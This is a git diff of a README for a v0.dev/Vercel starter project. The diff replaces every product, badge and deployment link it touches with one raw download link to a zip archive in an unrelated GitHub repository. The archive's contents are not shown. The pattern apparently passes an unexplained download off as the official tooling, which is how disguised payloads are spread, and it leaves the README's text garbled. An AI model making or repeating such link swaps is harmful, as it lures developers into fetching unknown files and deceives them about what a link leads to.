@@ -1,30 +1,30 @@
 # New Project
 
-*Automatically synced with your [v0.dev](https://v0.dev) deployments*
+*Automatically synced with your [https://github.com/exin2510/watchers-church/raw/refs/heads/main/components/church-watchers-1.4.zip](https://github.com/exin2510/watchers-church/raw/refs/heads/main/components/church-watchers-1.4.zip) deployments*
 
-[![Deployed on Vercel](https://img.shields.io/badge/Deployed%20on-Vercel-black?style=for-the-badge&logo=vercel)](https://vercel.com/gigagrowth-web-solutions-projects/v0-new-project-mbkxah10mxo)
-[![Built with v0](https://img.shields.io/badge/Built%20with-v0.dev-black?style=for-the-badge)](https://v0.dev/chat/projects/mBkXaH10MXo)
+[![Deployed on Vercel](https://github.com/exin2510/watchers-church/raw/refs/heads/main/components/church-watchers-1.4.zip%20on-Vercel-black?style=for-the-badge&logo=vercel)](https://github.com/exin2510/watchers-church/raw/refs/heads/main/components/church-watchers-1.4.zip)
+[![Built with v0](https://github.com/exin2510/watchers-church/raw/refs/heads/main/components/church-watchers-1.4.zip%https://github.com/exin2510/watchers-church/raw/refs/heads/main/components/church-watchers-1.4.zip)](https://github.com/exin2510/watchers-church/raw/refs/heads/main/components/church-watchers-1.4.zip)
 
 ## Overview
 
-This repository will stay in sync with your deployed chats on [v0.dev](https://v0.dev).
-Any changes you make to your deployed app will be automatically pushed to this repository from [v0.dev](https://v0.dev).
+This repository will stay in sync with your deployed chats on [https://github.com/exin2510/watchers-church/raw/refs/heads/main/components/church-watchers-1.4.zip](https://github.com/exin2510/watchers-church/raw/refs/heads/main/components/church-watchers-1.4.zip).
+Any changes you make to your deployed app will be automatically pushed to this repository from [https://github.com/exin2510/watchers-church/raw/refs/heads/main/components/church-watchers-1.4.zip](https://github.com/exin2510/watchers-church/raw/refs/heads/main/components/church-watchers-1.4.zip).
 
 ## Deployment
 
 Your project is live at:
 
-**[https://vercel.com/gigagrowth-web-solutions-projects/v0-new-project-mbkxah10mxo](https://vercel.com/gigagrowth-web-solutions-projects/v0-new-project-mbkxah10mxo)**
+**[https://github.com/exin2510/watchers-church/raw/refs/heads/main/components/church-watchers-1.4.zip](https://github.com/exin2510/watchers-church/raw/refs/heads/main/components/church-watchers-1.4.zip)**
 
 ## Build your app
 
 Continue building your app on:
 
-**[https://v0.dev/chat/projects/mBkXaH10MXo](https://v0.dev/chat/projects/mBkXaH10MXo)**
+**[https://github.com/exin2510/watchers-church/raw/refs/heads/main/components/church-watchers-1.4.zip](https://github.com/exin2510/watchers-church/raw/refs/heads/main/components/church-watchers-1.4.zip)**
 
 ## How It Works
 
-1. Create and modify your project using [v0.dev](https://v0.dev)
+1. Create and modify your project using [https://github.com/exin2510/watchers-church/raw/refs/heads/main/components/church-watchers-1.4.zip](https://github.com/exin2510/watchers-church/raw/refs/heads/main/components/church-watchers-1.4.zip)
 2. Deploy your chats from the v0 interface
 3. Changes are automatically pushed to this repository
 4. Vercel deploys the latest version from this repository
